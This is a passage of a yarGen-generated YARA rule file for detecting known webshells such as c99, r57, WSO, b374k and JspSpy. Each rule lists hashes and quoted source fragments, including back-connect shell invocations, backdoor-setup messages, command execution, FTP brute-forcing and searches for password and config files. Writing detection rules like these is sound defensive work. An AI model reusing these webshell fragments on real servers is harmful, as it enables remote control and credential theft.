      ( uint16(0) == 0x253c and filesize < 200KB and ( 8 of them )
      ) or ( all of them )
}

rule _2008_2009lite_2009mssql_114 {
   meta:
      description = "webshell - from files 2008.php, 2009lite.php, 2009mssql.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "5c00d5b172f123e7eb9c0735b60fbaf48b22eec4c7560d9586d891d85e0b3db5"
      hash2 = "61956e7a2fe44293ceaedc2e56ac52eee13064cd328fab1c5b314e5dc56012a6"
      hash3 = "77b769be4387a43095812683ce1759814aba6e12792a26e1cf0bb8b4156cd80d"
   strings:
      $x1 = "<a href=\"javascript:goaction('shell');\">Execute Command</a> | " fullword ascii
      $s2 = "<td><span style=\"float:right;\"><a href=\"http://www.4ngel.net\" target=\"_blank\"><?php echo str_replace('.','','P.h.p.S.p.y')" ascii
      $s3 = "p('<td align=\"center\"><font face=\"Wingdings 3\" size=4>=</font></td><td nowrap colspan=\"5\"><a href=\"javascript:godir(\\''." ascii
      $s4 = "<a href=\"javascript:goaction('logout');\">Logout</a> | " fullword ascii
      $s5 = "if ($doing == 'login') {" fullword ascii
      $s6 = "p('<td align=\"center\"><font face=\"Wingdings 3\" size=4>=</font></td><td nowrap colspan=\"5\"><a href=\"javascript:godir(\\''." ascii
      $s7 = "<input type=\"hidden\" name=\"doing\" value=\"login\">" fullword ascii
      $s8 = "p('<td><a href=\"'.$fileurl.'\" target=\"_blank\">'.$filedb['filename'].'</a></td>');" fullword ascii
      $s9 = "p('<meta http-equiv=\"refresh\" content=\"1;URL='.$self.'\">');" fullword ascii
      $s10 = "p('<h2>File Manager - Current disk free '.sizecount($free).' of '.sizecount($all).' ('.$used_percent.'%)</h2>');" fullword ascii
      $s11 = "p(' | <a href=\"javascript:godir(\\''.$drive->Path.'/\\');\" title=\"Type:'.$DriveTypeDB[$drive->DriveType].'\">'.$DriveTypeDB[$" ascii
      $s12 = "p('<a href=\"javascript:opfile(\\'newtime\\',\\''.$filedb['server_link'].'\\',\\''.$filedb['dirlink'].'\\');\">Time</a>');" fullword ascii
      $s13 = "p(' | <a href=\"javascript:godir(\\''.$drive->Path.'/\\');\" title=\"Type:'.$DriveTypeDB[$drive->DriveType].'\">'.$DriveTypeDB[$" ascii
      $s14 = "p(' | <a href=\"javascript:godir(\\''.$drive->Path.'/\\');\" title=\"Size:'.sizecount($drive->TotalSize).'&#13;Free:'.sizecount(" ascii
      $s15 = "$key = ($prefix ? $admin['cookiepre'] : '').$key;" fullword ascii
      $s16 = "setcookie($key, $value, $timestamp+$life, $admin['cookiepath'], $admin['cookiedomain'], $useport);" fullword ascii
      $s17 = "p('<a href=\"javascript:rename(\\''.$filedb['server_link'].'\\');\">Rename</a> | ');" fullword ascii
      $s18 = "p(' | <a href=\"javascript:godir(\\''.$drive->Path.'/\\');\" title=\"Size:'.sizecount($drive->TotalSize).'&#13;Free:'.sizecount(" ascii
      $s19 = "<a href=\"javascript:goaction('file');\">File Manager</a> | " fullword ascii
      $s20 = "11 => array('PHPINFO',(IS_PHPINFO ? '<a href=\"javascript:goaction(\\'phpinfo\\');\">Yes</a>' : 'No'))," fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _asp___1__asp__1___2014_10_23_14_54_16_NEW_WebShell__1__asp__1__UnKnown_Vip_115 {
   meta:
      description = "webshell - from files asp.asp,  (1).asp, asp (1)__2014-10-23-14-54-16.asp, NEW WebShell (1).asp, asp (1).asp, UnKnown Vip (1).asp, asp (1).asp, .asp, asp.asp, UnKnown Vip.asp, asp (1)__2014-10-23-14-54-16.asp, NEW WebShell (1)__2014-10-23-14-54-16.asp, vps.asp, NEW WebShell.asp,  (1)__2014-10-23-14-54-16.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "3e33f195e7c39b1b03d01f57278a2a6f0155bd5faaeaf2dc97e4159513115b5f"
      hash2 = "087dac16734d0c4d23d08080d6f8e031ed6eb19659a532827326671947d636f2"
      hash3 = "c4a1256a20bd05705365d4f53e7e968c7270ad54d429826d46307dd0bf47b0be"
      hash4 = "1cc6359207f91e48f9834698e71893682668f7d9d47cfabbfb2c8a8bbd1e29e0"
      hash5 = "afa4d004314ff296712e8d2c7d7707cc66b7c42bc4ba7beb3e4faf585a255894"
      hash6 = "c7530b4c6126a53e2036f0f0f1d05cebc960909a0471e01569ff6fd735572b29"
      hash7 = "fe68b71a08164d265887dc54dc95efde789d70eb77b318ca289a3b5998c90aca"
      hash8 = "187f477b13e2124e9c252dcb4d385407eee5aadcc466467ce959d388aaff2e0d"
      hash9 = "2134e5fad0d686a633c95fdbdf95cfd4cd316eb2c4ee136ef7e05c20a6059847"
      hash10 = "57ccf2912b792e21f63ecb9c4308a4276a3291c7f5fdf1e74063bcc9e250316e"
      hash11 = "d0cb05a853e883fce03015ac39b9e8c10adb902681bf320eedcd89dd27747d84"
      hash12 = "2e0c6dff1b01fd4a729201ee20cfb3e3db95aba65427afaf168efda3673f3750"
      hash13 = "a5728d9bfa3233f4c79b0551dc79dff0182392beadbb4cdfc823d4a8c68187f9"
      hash14 = "7080a9113a1bfccb5edc725746f0ed8cf44e09b67a78bcfc6ed2413f696e528e"
      hash15 = "f107bfb0bca4900116cad341733919b6138a82c2b2f269da17361703ae57a337"
   strings:
      $s1 = "RRS\"<html><meta http-equiv=\"\"Content-Type\"\" content=\"\"text/html; charset=gb2312\"\">\"" fullword ascii
      $s2 = "Set FS1 = CreateObject(\"Scripting.FileSystemObject\")" fullword ascii
      $s3 = "pcfileName=Request.ServerVariables(\"SCRIPT_NAME\")" fullword ascii
      $s4 = "RRS \"<form method=post>\"" fullword ascii
      $s5 = "</b>- \"&Server.MapPath(\".\"))" fullword ascii
      $s6 = "</b>- \"&Server.MapPath(\"/\")&\"<br>\")" fullword ascii
      $s7 = "tfile1.close" fullword ascii
      $s8 = "NewCode=Replace(tfile1.readall,Wcode,\"\")" fullword ascii
      $s9 = "tfile.writeline Wcode" fullword ascii
      $s10 = "RRS\"<td><input name='port' type='text' id='port' value='43958'></td>\"" fullword ascii
      $s11 = "tfile.close" fullword ascii
      $s12 = "if M=\"\" then response.end" fullword ascii
      $s13 = "if Instr(tfile1.readall,Wcode)=0 then" fullword ascii
      $s14 = "objCountFile.Write NewCode" fullword ascii
      $s15 = "NewCode=Replace(tfile1.readall,Wcode,addCode2)" fullword ascii
      $s16 = " <a href='javascript:FullForm(\"\"\"&replace(Wpath&myfile.name,\"\\\",\"\\\\\")&\"\"\",\"\"DownFile\"\")' class='am' title='" fullword ascii
      $s17 = "RRS \"<a href='javascript:FullForm(\"\"\"&replace(Wpath&myfile.name,\"\\\",\"\\\\\")&\"\"\",\"\"MoveFile\"\")' class='am' title=" ascii
      $s18 = "RRS \"<a href='javascript:FullForm(\"\"\"&replace(Wpath&myfile.name,\"\\\",\"\\\\\")&\"\"\",\"\"EditFile\"\")' class='am' title=" ascii
      $s19 = "RRS \"<a href='javascript:FullForm(\"\"\"&replace(Wpath&myfile.name,\"\\\",\"\\\\\")&\"\"\",\"\"CopyFile\"\")' class='am' title=" ascii
      $s20 = "InsertAllFiles NewPath,Wcode,pc" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 400KB and ( 8 of them )
      ) or ( all of them )
}

rule _c99_w4cking_c99_locus7s_116 {
   meta:
      description = "webshell - from files c99_w4cking.php, c99_locus7s.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "07f9ec716fb199e00a90091ffba4c2ee1a328a093a64e610e51ab9dd6d33357a"
      hash2 = "960feb502f913adff6b322bc9815543e5888bbf9058ba0eb46ceb1773ea67668"
   strings:
      $s1 = "function myshellexec($command) {" fullword ascii
      $s2 = " exec(\"$cmd > /dev/null &\");" fullword ascii
      $s3 = "$_POST['proxyhostmsg']=\"</br></br><center><font color=red size=3><b>Failed!</b></font></br></br><b>Note:</b> If for some reason" ascii
      $s4 = " if(eregi(\"./shbd $por\",$scan)){ $data = (\"\\n</br></br>Process found running, backdoor setup successfully.\"); }elseif(eregi" ascii
      $s5 = "hbd $por\",$scan)){ $data = (\"\\n</br>Process not found running, backdoor not setup successfully.\"); }" fullword ascii
      $s6 = " if(eregi(\"./shbd $por\",$scan)){ $data = (\"\\n</br></br>Process found running, backdoor setup successfully.\"); }elseif(eregi" ascii
      $s7 = " $blah = ex($p2.\" /tmp/back \".$_POST['backconnectip'].\" \".$_POST['backconnectport'].\" &\");" fullword ascii
      $s8 = "$_POST['backcconnmsge']=\"</br></br><b><font color=red size=3>Error:</font> Can't backdoor host!</b>\";" fullword ascii
      $s9 = "$_POST['proxyhostmsg']=\"</br></br><center><font color=green size=3><b>Success!</b></font></br></br><a href=$host:6543>$host:654" ascii
      $s10 = "$host = getenv(\"HTTP_HOST\");" fullword ascii
      $s11 = " $ip = gethostbyname($_SERVER[\"HTTP_HOST\"]);" fullword ascii
      $s12 = "$_POST['proxyhostmsg']=\"</br></br><center><font color=red size=3><b>Failed!</b></font></br></br><b>Note:</b> If for some reason" ascii
      $s13 = "$_POST['proxyhostmsg']=\"</br></br><center><font color=green size=3><b>Success!</b></font></br></br><a href=$host:6543>$host:654" ascii
      $s14 = "if (!empty($_POST['backconnectip']) && !empty($_POST['backconnectport']) && ($_POST['use']==\"Perl\"))" fullword ascii
      $s15 = " //$blah = ex(\"gcc -o /tmp/backc /tmp/back.c\");" fullword ascii
      $s16 = " $blah = ex(\"/tmp/backc \".$_POST['backconnectip'].\" \".$_POST['backconnectport'].\" &\");" fullword ascii
      $s17 = " $scan = myshellexec(\"ps aux\"); " fullword ascii
      $s18 = "if (!empty($_POST['backconnectport']) && ($_POST['use']==\"shbd\"))" fullword ascii
      $s19 = "if (!empty($_POST['backconnectip']) && !empty($_POST['backconnectport']) && ($_POST['use']==\"C\"))" fullword ascii
      $s20 = " array(\"<b>[Backdoor Host]</b>\",$surl.\"act=shbd\")," fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _b374k_2_6_source_b374k_2_7_source_117 {
   meta:
      description = "webshell - from files b374k-2.6.source.php, b374k-2.7.source.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "c14466232481a3aa9192507127f2ca43898228671e5e87a17ddd05383c758746"
      hash2 = "d31034d5e4fd8d5d8efe640c4d2aa7ac43c71989f84fb4e92606a18563b3fd5e"
   strings:
      $s1 = "$s_dump_tbl_link = $s_self.\"x=db&connect=&sqlhost=\".$s_sql['host'].\"&sqlport=\".$s_sql['port'].\"&sqluser=\".$s_sql['user']." ascii
      $s2 = "$s_dump_tbl_link = $s_self.\"x=db&connect=&sqlhost=\".$s_sql['host'].\"&sqlport=\".$s_sql['port'].\"&sqluser=\".$s_sql['user']." ascii
      $s3 = "$s_error = ob_get_contents();" fullword ascii
      $s4 = "ss=\".$s_sql['pass'].\"&sqltype=\".$s_sql['type'].\"&sqlcode=\".$s_dump_tbl;" fullword ascii
      $s5 = "input[type=checkbox].css-checkbox:checked + label.css-label{background-position:0 -15px;}" fullword ascii
      $s6 = "<span style='float:right;'><a href='\".$s_self.\"x=db&connect=connect&sqlhost=\".$s_sql['host'].\"&sqlport=\".$s_sql['port'].\"&" ascii
      $s7 = "input[type=checkbox].css-checkbox + label.css-label{padding-left:20px;height:15px;display:inline-block;line-height:15px;backgrou" ascii
      $s8 = "$s_checkbox = ($s_theme==\"bright\")? $s_bright_cb:$s_dark_cb;" fullword ascii
      $s9 = ".viewfilecontent{padding:11px 8px;}" fullword ascii
      $s10 = "#header{text-align:left;margin:0;padding:0;}" fullword ascii
      $s11 = "<input type='hidden' name='sqlhost' value='\".$s_sql['host'].\"' />" fullword ascii
      $s12 = "if(function_exists(\"pg_connect\")) $s_sqllist[\"pgsql\"] = \"connect to PostgreSQL <span class='desc' style='font-size:12px;'>-" ascii
      $s13 = "if(function_exists(\"pg_connect\")) $s_sqllist[\"pgsql\"] = \"connect to PostgreSQL <span class='desc' style='font-size:12px;'>-" ascii
      $s14 = "#header td{margin:0;padding:0;}" fullword ascii
      $s15 = ".headtbl,.myboxtbl{width:100%;}" fullword ascii
      $s16 = "$s_color = ($s_theme==\"bright\")? $s_bright:$s_dark;" fullword ascii
      $s17 = "esc' style='font-size:12px;'>- using mssql_* or sqlsrv_*</span>\";" fullword ascii
      $s18 = ".txtarea{width:100%;height:370px;}" fullword ascii
      $s19 = "<input type='hidden' name='sqluser' value='\".$s_sql['user'].\"' />" fullword ascii
      $s20 = "input[type=checkbox].css-checkbox + label.css-label{padding-left:20px;height:15px;display:inline-block;line-height:15px;backgrou" ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 400KB and ( 8 of them )
      ) or ( all of them )
}

rule _wso_4_2_5__v_118 {
   meta:
      description = "webshell - from files wso-4.2.5.php, .v.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "b7f166d633c1f9597cfa70328b568993a75eab3ab00fbccd6bcd91165e171cdb"
      hash2 = "3628cc351602552e975ead1af85af7a20e1e06714f5aaada34d050c559ac4c70"
   strings:
      $s1 = "eckbox name=show_errors value=1 '.(!empty($_POST['p2'])||$_COOKIE[md5($_SERVER['HTTP_HOST']).'stderr_to_out']?'checked':'').'> r" ascii
      $s2 = "echo '</select></label><input type=button onclick=\"add(d.cf.alias.value);if(d.cf.ajax.checked){a(null,null,d.cf.alias.value,d.c" ascii
      $s3 = "echo '<script>p3_=\"\";</script><form onsubmit=\"g(null,null,\\'' . urlencode($_POST['p1']) . '\\',null,this.touch.value);return" ascii
      $s4 = "Port: <input type='text' name='port' value='31337'> Password: <input type='text' name='pass'> Using: <label><select name='using'" ascii
      $s5 = "getpwuid (\"Read\" /etc/passwd)</span><table><form onsubmit=\\'g(null,null,\"5\",this.param1.value,this.param2.value);return fal" ascii
      $s6 = "echo \"</select></label><input type='submit' value='submit'/> <input type=checkbox name=ajax value=1 \".(@$_COOKIE[md5($_SERVER[" ascii
      $s7 = " type=checkbox name=ajax value=1 '.(@$_COOKIE[md5($_SERVER['HTTP_HOST']).'ajax']?'checked':'').'> send using AJAX <input type=ch" ascii
      $s8 = "echo '<script>p3_=\"\";</script><form onsubmit=\"g(null,null,\\'' . urlencode($_POST['p1']) . '\\',null,this.chmod.value);return" ascii
      $s9 = "echo '<span>Copy (read file)</span><form onsubmit=\\'g(null,null,\"1\",this.param.value);return false;\\'><input class=\"toolsIn" ascii
      $s10 = "<td><form onsubmit=\\\"\".( function_exists('actionConsole')? \"g('Console',null,this.c.value);\":'' ).\"return false;\\\"><span" ascii
      $s11 = "e;\"><input type=text name=touch value=\"'.date(\"Y-m-d H:i:s\", @filemtime($_POST['p1'])).'\"><input type=submit value=\"submit" ascii
      $s12 = "param><input type=submit value=\"submit\"></form><br><span>Ini_restore (read file)</span><form onsubmit=\\'g(null,null,\"4\",thi" ascii
      $s13 = "thub.svg','width':100,'height':100}},'opacity':{'value':0.5,'random':true,'anim':{'enable':false,'speed':1,'opacity_min':0.1,'sy" ascii
      $s14 = "<script>particlesJS('particles-js', {'particles':{'number':{'value':80,'density':{'enable':true,'value_area':800}},'color':{'val" ascii
      $s15 = "ue},'modes':{'grab':{'distance':200,'line_linked':{'opacity':0.5}},'bubble':{'particles_nb':2}}},'retina_detect':true});</script" ascii
      $s16 = "echo '<form onsubmit=\"g(null,null,\\'' . urlencode($_POST['p1']) . '\\',null,this.name.value);return false;\"><input type=text " ascii
      $s17 = "=name value=\"'.htmlspecialchars($_POST['p1']).'\"><input type=submit value=\"submit\"></form>';" fullword ascii
      $s18 = "label:before {content:'';right:0; top:0;width:17px; height:17px;background:#202832;position:absolute;pointer-events:none;display" ascii
      $s19 = "e;\"><input type=text name=chmod value=\"'.substr(sprintf('%o', fileperms($_POST['p1'])),-4).'\"><input type=submit value=\"subm" ascii
      $s20 = "<script>particlesJS('particles-js', {'particles':{'number':{'value':80,'density':{'enable':true,'value_area':800}},'color':{'val" ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 200KB and ( 8 of them )
      ) or ( all of them )
}

rule _c66_c99v2_c99shell_Shell__ci___Biz_was_here_c99_119 {
   meta:
      description = "webshell - from files c66.php, c99v2.php, c99shell.php, Shell [ci] .Biz was here.php, c99.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "5d7709a33879d1060a6cff5bae119de7d5a3c17f65415822fd125af56696778c"
      hash2 = "80ec7831ae888d5603ed28d81225ed8b256c831077bb8feb235e0a1a9b68b748"
      hash3 = "d08c928417669a722d324df5ea1448b65637b2e109c704556e3870dcfe07fee1"
      hash4 = "9309773b9b00bcb9fe6c71a954dd07e330750d8d36bd11826d98e0fd9963fbfa"
      hash5 = "383d771b55bbe5343bab946fd7650fd42de1933c4c8f32449d9a40c898444ef1"
   strings:
      $s1 = "<tr><td width=\"100%\" height=\"1\" valign=\"top\" colspan=\"2\"><p align=\"center\"><b>:: <a href=\"<?php echo $surl; ?>act=cmd" ascii
      $s2 = "ho urlencode($d); ?>\"><b>Command execute</b></a> ::</b></p></td></tr>" fullword ascii
      $s3 = "  echo \"<b>Result of execution this command</b>:<br>\";" fullword ascii
      $s4 = "$login_txt = \"Restricted area\"; //http-auth message." fullword ascii
      $s5 = "/* If you publish free shell and you wish" fullword ascii
      $s6 = "  array(\"find config* files in current dir\", \"find . -type f -name \\\"config*\\\"\")," fullword ascii
      $s7 = " <br></center><b>Base64:</b><center>base64_encode - <input type=text size=35 onFocus=\\\"this.select()\\\" onMouseover=\\\"this." ascii
      $s8 = "  array(\"find config* files\", \"find / -type f -name \\\"config*\\\"\")," fullword ascii
      $s9 = " echo \"</center><b>Url:</b><center><br>urlencode - <input type=text size=35 onFocus=\\\"this.select()\\\" onMouseover=\\\"this." ascii
      $s10 = "  array(\"show opened ports\", \"netstat -an | grep -i listen\")" fullword ascii
      $s11 = "// Command-aliases" fullword ascii
      $s12 = " echo \"<center>base64_decode - \";" fullword ascii
      $s13 = "  array(\"find service.pwd files in current dir\", \"find . -type f -name service.pwd\")," fullword ascii
      $s14 = "  array(\"find config.inc.php files\", \"find / -type f -name config.inc.php\")," fullword ascii
      $s15 = "  array(\"find all service.pwd files\", \"find / -type f -name service.pwd\")," fullword ascii
      $s16 = "$tmpdir_log = \"./\"; //Directory logs of long processes (e.g. brute, scan...)" fullword ascii
      $s17 = "$sort_default = \"0a\"; //Default sorting, 0 - number of colomn, \"a\"scending or \"d\"escending" fullword ascii
      $s18 = "// Registered executable file-types." fullword ascii
      $s19 = " echo \"</center><br><b>Base convertations</b>:<center>dec2hex - <input type=text size=35 onFocus=\\\"this.select()\\\" onMouseo" ascii
      $s20 = "0 - files and folders (as default)," fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule _list1_Jspspyweb_120 {
   meta:
      description = "webshell - from files list1.jsp, Jspspyweb.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "43155417ae71646a6caa1151c865fd26c2ac8f333aa155123310e252c23f8827"
      hash2 = "ae77377b007733bb984ccf751ba2ba26a5befc293a2266ca00d7e53125299947"
   strings:
      $s1 = "    out.print(\"<form name=address method=post target=FileFrame onSubmit='checkUrl();'>\");" fullword ascii
      $s2 = "        while ((len = input.read(buffer, 0, bufferLen)) != -1) {" fullword ascii
      $s3 = "String encodeChange(String str)throws Exception{" fullword ascii
      $s4 = "        out.println(\"file not find!!!\");" fullword ascii
      $s5 = "    if(ff.getAbsolutePath().equals(zipPath))return;" fullword ascii
      $s6 = "        return new String(str.getBytes(\"ISO-8859-1\"),\"gb2312\");" fullword ascii
      $s7 = "void zipEntry(ZipOutputStream zipOs, String initPath,String filePath,String zipPath) throws Exception {" fullword ascii
      $s8 = "    entry.setCrc(crc.getValue());" fullword ascii
      $s9 = "ateChange'>\");" fullword ascii
      $s10 = "            zipEntry(zipOs, initPath, filePath + File.separator + files[i],zipPath);" fullword ascii
      $s11 = "            out.print(filename+\"file date change error\");" fullword ascii
      $s12 = "        out.print(\"file zip error\");" fullword ascii
      $s13 = "        document.write(\"filename:<input name='Filename' type='text' size=60 readonly value='\"+file+\"'><br>\");" fullword ascii
      $s14 = "        if(f.setLastModified(calendar.getTimeInMillis()))" fullword ascii
      $s15 = "    if (idx != -1) {" fullword ascii
      $s16 = "        Calendar calendar=Calendar.getInstance();" fullword ascii
   condition:
      ( ( uint16(0) == 0x253c or uint16(0) == 0x213c ) and filesize < 100KB and ( 8 of them )
      ) or ( all of them )
}

rule __Asp_asp_121 {
   meta:
      description = "webshell - from files -Asp.asp, asp.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "480b8dd9f3b52a17aa546f6b30557bb40672605e689b84beea67c09b00a60ec9"
      hash2 = "3dbe68406df840d46857ef9d7a5e0352d6c38ba08fd9ccdf39e0b39e78904412"
   strings:
      $s1 = "<%@LANGUAGE=\"VBScript.Encode\" CODEPAGE=\"936\"%>" fullword ascii
      $s2 = "D /M+lDnr(L+1OcJUmMk2YrUTRok^n?H/Onsr4%n1YE#,ThYAAA==^#~@%>" fullword ascii
      $s3 = "<%#@~^GgAAAA==~K4%;W!xYwk^nRqDrY" fullword ascii
      $s4 = "x[,k6PZgIAAA==^#~@%>" fullword ascii
      $s5 = "PW[mYl,XQkAAA==^#~@%>" fullword ascii
      $s6 = "P1AQAAA==^#~@%>" fullword ascii
      $s7 = "<%#@~^QAAAAA==~U+O,W(LsUr,xPU+.\\" fullword ascii
      $s8 = "'BEvvPs+DtGNx2K/O@*r~lRAAAA==^#~@%>" fullword ascii
      $s9 = "<%#@~^HQAAAA==~6NCDl,'PM+$;+kYcJ1XW[9lYmE#,mwkAAA==^#~@%>" fullword ascii
      $s10 = "@*rPIxAAAA==^#~@%>" fullword ascii
      $s11 = "color: #00CC00;" fullword ascii
      $s12 = "<%#@~^FgAAAA==~Kx~" fullword ascii
      $s13 = "PqgwAAA==^#~@%>" fullword ascii
      $s14 = "<%#@~^FAAAAA==~K4%;W!xYwk^nR;VG/" fullword ascii
      $s15 = "PE@!J0G.s@*J,qQgAAA==^#~@%>" fullword ascii
      $s16 = "<table width=\"100%\" height=\"100%\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\" bordercolor=\"#FFFFFF\">" fullword ascii
      $s17 = "<td height=\"100%\"> " fullword ascii
      $s18 = "<%#@~^GwAAAA==~\"+daW" fullword ascii
      $s19 = "J,TAYAAA==^#~@%>" fullword ascii
      $s20 = "OsbVn'K4%oUrR;.+mY+:naYwk^+cDn5!+dYvE/H0[2mYtEbBK.E" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 10KB and ( 8 of them )
      ) or ( all of them )
}

rule _DarkBlade1_5_indexx_Cmdwebshell_122 {
   meta:
      description = "webshell - from files DarkBlade1.5.asp, indexx.asp, Cmdwebshell.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "1acff7ac75d73a0c7589e0403e5e7be7b4708faf278f76eb45008710a7f9a4c8"
      hash2 = "a828153a8ec75ebeec010bd9e0fa5873b9c2602c0caa393a115075a16d74d0ab"
      hash3 = "ee03d95eedaec69608600dc07b35db774c0182e9e60787c4cda9626e4dc0d513"
   strings:
      $s1 = "Response.AddHeader\"Content-Disposition\",\"Attachment; Filename=\"&fileName" fullword ascii
      $s2 = "Server.ScriptTimeOut=300" fullword ascii
      $s3 = "echo\" Encode:\"" fullword ascii
      $s4 = "<%@ LANGUAGE='VBScript' CODEPAGE='65001'%>" fullword ascii
      $s5 = "str=Replace(str,\".\",\"\\.\")" fullword ascii
      $s6 = "Response.ContentType=\"Application/Octet-Stream\"" fullword ascii
      $s7 = "theFile.Close" fullword ascii
      $s8 = "Response.Flush()" fullword ascii
      $s9 = "'-------------------------------Config-------------------------------" fullword ascii
      $s10 = "Response.Write str" fullword ascii
      $s11 = "echo\"<tr class='alt\"&num&\"' onmouseover=\"\"javascript:this.className='focusTr';\"\" onmouseout=\"\"javascript:this.className" ascii
      $s12 = "echo\"<tr class='alt\"&num&\"' onmouseover=\"\"javascript:this.className='focusTr';\"\" onmouseout=\"\"javascript:this.className" ascii
      $s13 = "echo\"<tr class=\"\"head\"\">\"" fullword ascii
      $s14 = "str=Replace(str,\"(\",\"\\(\")" fullword ascii
      $s15 = "echo\"<td nowrap>\"&str&\"</td>\"" fullword ascii
      $s16 = "echo\"</span><br>\"" fullword ascii
      $s17 = ".hidehref{font:12px Arial,Tahoma;color:#646464;}" fullword ascii
      $s18 = "echo\"File\"" fullword ascii
      $s19 = "str=Replace(str,\"*\",\"\\*\")" fullword ascii
      $s20 = "doTd\"<b>Action</b>\",\"\"" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 400KB and ( 8 of them )
      ) or ( all of them )
}

rule _c99v2_c99shell_Shell__ci___Biz_was_here_c99_123 {
   meta:
      description = "webshell - from files c99v2.php, c99shell.php, Shell [ci] .Biz was here.php, c99.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "80ec7831ae888d5603ed28d81225ed8b256c831077bb8feb235e0a1a9b68b748"
      hash2 = "d08c928417669a722d324df5ea1448b65637b2e109c704556e3870dcfe07fee1"
      hash3 = "9309773b9b00bcb9fe6c71a954dd07e330750d8d36bd11826d98e0fd9963fbfa"
      hash4 = "383d771b55bbe5343bab946fd7650fd42de1933c4c8f32449d9a40c898444ef1"
   strings:
      $s1 = "   $tmp = @ob_get_contents();" fullword ascii
      $s2 = " array(\"<b>FTP brute</b>\",$surl.\"act=ftpquickbrute&d=%d\")," fullword ascii
      $s3 = " array(\"<b>Logout</b>\",\"#\\\" onclick=\\\"if (confirm('Are you sure?')) window.close()\")" fullword ascii
      $s4 = "   $phpinfo = base64_encode(ob_get_contents());" fullword ascii
      $s5 = " array(\"<img src=\\\"\".$surl.\"act=img&img=forward\\\" alt=\\\"Forward\\\" height=\\\"20\\\" width=\\\"20\\\" border=\\\"0\\\"" ascii
      $s6 = " array(\"<b>PHP-code</b>\",$surl.\"act=eval&d=%d\")," fullword ascii
      $s7 = " array(\"<b>Encoder</b>\",$surl.\"act=encoder&d=%d\")," fullword ascii
      $s8 = " array(\"<b>Feedback</b>\",$surl.\"act=feedback&d=%d\")," fullword ascii
      $s9 = " array(\"<b>Sec.</b>\",$surl.\"act=security&d=%d\")," fullword ascii
      $s10 = "  echo \"<center><b>Thanks for your feedback! Your ticket ID: \".$ticket.\".</b></center>\";" fullword ascii
      $s11 = "  $ticket = substr(md5(microtime()+rand(1,1000)),0,6);" fullword ascii
      $s12 = " array(\"<b>SQL</b>\",$surl.\"act=sql&d=%d\")," fullword ascii
      $s13 = " array(\"<img src=\\\"\".$surl.\"act=img&img=buffer\\\" alt=\\\"Buffer\\\" height=\\\"20\\\" width=\\\"20\\\" border=\\\"0\\\">" ascii
      $s14 = " array(\"<img src=\\\"\".$surl.\"act=img&img=search\\\" alt=\\\"Search\\\" height=\\\"20\\\" width=\\\"20\\\" border=\\\"0\\\">" ascii
      $s15 = "drop\\\" alt=\\\"Delete\\\" height=\\\"13\\\" width=\\\"11\\\" border=\\\"0\\\"></a>&nbsp;\";" fullword ascii
      $s16 = "\\\" border=\\\"0\\\"></a>&nbsp;\";" fullword ascii
      $s17 = "   array(\"<img src=\\\"\".$surl.\"act=img&img=download\\\" border=\\\"0\\\">\",\"download\")," fullword ascii
      $s18 = " array(\"<img src=\\\"\".$surl.\"act=img&img=back\\\" alt=\\\"Back\\\" height=\\\"20\\\" width=\\\"20\\\" border=\\\"0\\\">\",\"" ascii
      $s19 = " array(\"<b>Self remove</b>\",$surl.\"act=selfremove\")," fullword ascii
      $s20 = " array(\"<img src=\\\"\".$surl.\"act=img&img=up\\\" alt=\\\"UPDIR\\\" height=\\\"20\\\" width=\\\"20\\\" border=\\\"0\\\">\",$su" ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule _r57shell127_r57shell_r57_Mohajer22_r57_kartal_r57_r57_iFX_124 {
   meta:
      description = "webshell - from files r57shell127.php, r57shell.php, r57_Mohajer22.php, r57_kartal.php, r57.php, r57_iFX.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "e88efb3e4c358ce3ad25f7eca3d437cb8c27572772f29e42604c856df864a860"
      hash2 = "05f30186c9edbbf906f8971df2470fa1411f8c029ec7109f20f16ed197191644"
      hash3 = "1db0549066f294f814ec14ba4e9f63d88c4460d68477e5895236173df437d2b8"
      hash4 = "5d07fdfee2dc6d81da26f05028f79badd10dec066909932129d398627b2f4e94"
      hash5 = "fad01921f2ccc7dfba8cc41af6981f08bf40a3fa96e6787d34582e3529d8b3d0"
      hash6 = "6dc417db9e07420a618d44217932ca8baf3541c08d5e68281e1be10af4280e4a"
   strings:
      $s1 = "if (empty($_POST['cmd'])&&!$safe_mode) { $_POST['cmd']=($windows)?(\"dir\"):(\"ls -lia\"); }" fullword ascii
      $s2 = "$lin1 = ex('sysctl -n kernel.ostype');" fullword ascii
      $s3 = "$lin2 = ex('sysctl -n kernel.osrelease');" fullword ascii
